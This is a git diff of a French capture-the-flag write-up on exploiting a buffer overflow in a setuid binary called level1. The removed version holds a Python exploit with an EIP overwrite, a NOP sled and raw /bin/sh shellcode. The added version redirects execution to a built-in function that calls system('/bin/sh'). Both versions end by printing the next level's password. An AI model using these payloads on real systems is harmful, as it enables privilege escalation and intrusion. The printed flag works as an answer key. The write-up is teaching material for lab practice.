@@ -1,118 +1,83 @@
-# On arrive sur le home, on a un binaire setuid level2
-# en essayant de le lance avec 0 ou n param, le programme a l'air d'attendre quelque chose et ne retourne rien
-# Once again >>> gdb :D 
+Pour voir ce qu'il y a dans le binaire nous faison un objdump sur celui celui
 
-gdb ./level1
+>> objdump -d ./level1 > dump
 
-# On voit que le binaire est simplement compose d'un gets, une fonction c qui ne protege pas des buffer overflow
+On voit que dans le main il y a une fonction gets qui est vulnerable au buffer 
+overflow
 
-# Apres quelque recherche voici comment attaquer par buffer overflow notre binaire
+Après quelques recherche je suis tombé sur ce site qui aide Pour
+exploiter des buffers overflow:
 
-# Tout d'abord on determine la taille de notre buffer dans gdb
+https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
 
-(gdb) disass main
-b *0x08048495                                   // On met un breakpoint sur l'instruction leave (juste avant le return) 
+On génere une longue chaine aléatoire :
 
-# Ensuite on continue et on surcharge le buffer avec des "A"
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+et on la met dans un fichier /tmp/customstr et on l'injecte via gdb :
+pour voir a quel adresse on segfault pour avoir l'adresse du registre
+eip
 
-# EIP est le registre qui stocke un pointeur qui indique la prochaine instruction a executer, elle designe donc la
-# fin de la Stack
-# C'est ce pointeur qui est override par notre buffer overflow, il est donc juste apres notre buffer. 
+>> gdb level1
+>> run < /tmp/customstr
 
-info frame
->>>
-Stack level 0, frame at 0xbffff700:
- eip = 0x8048483 in main; saved eip 0xb7e454d3
- called by frame at 0xbffff770
- Arglist at 0xbffff6f8, args:
- Locals at 0xbffff6f8, Previous frame's sp is 0xbffff700
- Saved registers:
-  ebp at 0xbffff6f8, eip at 0xbffff6fc
+<< Program received signal SIGSEGV, Segmentation fault.
+    0x63413563 in ?? ()
 
-# Ici on voit que le registre EIP est a l'adress 0xbffff6fc
-# Ensuite on cherche le debut du buffer
-# Il faut savoir que que la stack stocke les variables de maniere degressif, c'est a dire que l'adresse du haut
-# de la stack est plus petite en valeur que celle du fond de la stack et qu'elle est base sur un modele LIFO 
-# (last in first out), ce qui veut dire que plus tot la variables est declarer, plus son adresse dans la stack va etre une
-# valeur eleve. EIP etant declarer au tout debut, vas etre stocke au fond de la stack tandis que le buffer (seule variable
-# du programme) vas etre stocke tout en haut de celle continue
+On voit qu'il segfault a l'adresse 0x63413563, on copie ca sur le site
+et on obtiens un offset de 76.
 
-# Petit schema de la stack:
+Il faut donc une chaine de 76 charactère pour overflow jusqu'a eip
 
-|               |
-|               |
-|---------------| --------> Top de la stack ESP 
-|               |
-|    variables  |
-|    dont       |
-|    buffer     |
-|               |
-|               |
-|---------------| --------> Addresse de EIP (ici 0xbffff6fc)
-|      EIP      |
-|               |
+pour ce qui est d'eip, il faut lui donner l'adresse de la prochaine
+instruction a executer.
 
-#En theorie, le buffer devrais commencer pas trop loin du haut de la stack vu que c'est surement une des seule variable
-# du programme
-#On affiche donc 24 "mots" (24 x 4 octet) apres le haut de la stack (ESP)
+en recherchant sur internet, j'ai d'abords pensé a mettre l'adresse
+juste apres celui ci, et enchainé avec un Nop sled suivi d'un shellcode
+executant /bin/sh mais je me suis souvenu avoir vu une fonction run dans 
+l'objdump au depart.
 
-x/24wx $esp
->>>>
-0xbffff6a0:	0xbffff6b0	0x0000002f	0xbffff6fc	0xb7fd0ff4
-0xbffff6b0:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbffff6c0:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
+on l'ouvre avec gdb :
 
-#Ayant rempli le buffer du caractere "A" (0x41), on voit tres bien la demarquation entre le debut du buffer et le reste 
-# le buffer commence donc a 0xbffff6b0 et se termine a EIP soit 0xbffff6fc donc le buffer fais 
-# 0xbffff6fc - 0xbffff6b0 = 0x4c = 76
+(gdb) disass run
+Dump of assembler code for function run:
+   0x08048444 <+0>:     push   %ebp
+   0x08048445 <+1>:     mov    %esp,%ebp
+   0x08048447 <+3>:     sub    $0x18,%esp
+   0x0804844a <+6>:     mov    0x80497c0,%eax
+   0x0804844f <+11>:    mov    %eax,%edx
+   0x08048451 <+13>:    mov    $0x8048570,%eax
+   0x08048456 <+18>:    mov    %edx,0xc(%esp)
+   0x0804845a <+22>:    movl   $0x13,0x8(%esp)
+   0x08048462 <+30>:    movl   $0x1,0x4(%esp)
+   0x0804846a <+38>:    mov    %eax,(%esp)
+   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
+   0x08048472 <+46>:    movl   $0x8048584,(%esp)
+   0x08048479 <+53>:    call   0x8048360 <system@plt>
+   0x0804847e <+58>:    leave
+   0x0804847f <+59>:    ret
 
-# Cette valeur peut etre verifier en entrant 76 fois la lettre "A", puis en incrementant et observant
-# la valeur du registre EIP
+on voit a la fin qu'il y a un appel a system et juste avant on lui
+donne le contenu de 0x8048584 en parametre via esp
 
-# ensuite on vas cree un script python qui vas nous generer notre input, il devra surcharger le buffer pour overrider le registre
-# EIP (registre qui pointre sur la prochaine instruction), changer la valeur de EIP avec l'adresse de notre shellcode
-# qui lui vas nous ouvrir un shell avec les droits de level2
+(gdb) x/s 0x8048584
+0x8048584:       "/bin/sh"
 
-# Cependant en fonction de comment/ou on lance le programme notre shell code ne sera pas situé au meme endroit
-# pour contrer ce phenomene on injecte ce qu'on appelle un nopsled, un tres grand nombre d'instruction nop qui ne
-# font absolument rien mais qui n'arrete pas le programme pour autant, donc on peut se permettre de pointer 
-# un peu au hasard au milieu de ce nopsled et le processe va glisser le long de cette rampe de nop jusqu'a notre shell code
+cette fonction execute donc un appel system a /bin/sh
+je decide donc d'injecter ma longue chaine de caractere pour remplir
+le buffer suivi de l'adresse de cette fonction run (en respectant l'endianness)
 
-# Voici a quoi vas ressembler le code:
+>> python -c "print('*' * 76 + '\x08\x04\x84\x44'[::-1])" > /tmp/customstr
 
-import struct
+il suffit ensuite d'injecter la chaine dans le binaire tout en gardant un
+acces a stdin. pour cela je rappel un cat juste apres avoir cat mon fichier
 
-// On rempli le buffer de lettre "A"
-pad = "\x41" * 76
-// format to seul la valeur en string au format little endian
-EIP = struct.pack("I", 0xbffff710)
-// shellcode qui execute /bin/sh
-shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
-// NOPsled
-NOP = "\x90" * 100
-// string bien formatté
-print pad + EIP + NOP + shellcode
+>> (cat /tmp/customstr; cat) | ./level1
+<< Good... Wait what?
+>> whoami
+<< level2
 
-# On essaie :
+nous sommes maintenant level2, il ne reste plus qu'a recuperer le flag
 
-python /tmp/azur/exploit.py | ./level1
->> Illegal instruction (core dumped)
-
-# Apres avoir essayé avec gdb cela fonctionne, pourquoi ? Parce que comme j'ai expliquer plus haut, la memoire change 
-# en fonction d'ou le programme est lance, comment, et quel variable d'environnement sont presente.
-# meme si on utilise la commande "gdb ./level1", le deboggeur utilise lui le chemin absolu pour lancer le binaire, ce
-# qui est different de notre "python /tmp/azur/exploit.py | ./level1"
-
-# On essaie maintenant avec le chemin absolu
-
-python /tmp/azur/exploit.py | ~/level1
-$ whoami
->>> level2
-$ cd ../level2
-$ cat .pass
->>> 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+>> cat /home/user/level2/.pass
+<< 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
